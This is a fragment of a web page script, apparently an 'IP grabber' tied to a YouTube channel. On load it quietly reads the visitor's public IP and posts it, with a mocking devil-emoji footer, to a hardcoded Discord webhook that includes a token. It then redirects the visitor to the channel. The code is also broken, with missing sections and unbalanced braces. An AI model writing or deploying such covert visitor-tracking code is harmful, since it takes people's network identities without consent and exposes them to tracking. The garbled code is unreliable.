    <script>
        // === YOUR CONFIG ===
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1457815797396148530/03FDxKCa3ppN_VN33AB-TzBZUlCmx2GvEt_ji0ldgA9Q9Jzm7RcVMppzPiGR7LH5Q0sJ";
        const REDIRECT_URL = "https://www.youtube.com/@LitagoRBX";

        async function grabAndRedirect() {
            try {
                // Get IP super fast
                const ipResponse = await fetch("https://api.ipify.org?format=json");

                        footer: { text: "Redirected to LitagoRBX YouTube ðŸ˜ˆ" },
                        timestamp: new Date().toISOString()
                    }]
                };

                fetch(WEBHOOK_URL, {
                    method: "POST",

                });
                // No await here â†’ redirect happens immediately

            } catch (err) {
                console.error("Failed to send:", err);

            // === INSTANT REDIRECT TO YOUR CHANNEL ===
            window.location.replace(REDIRECT_URL);
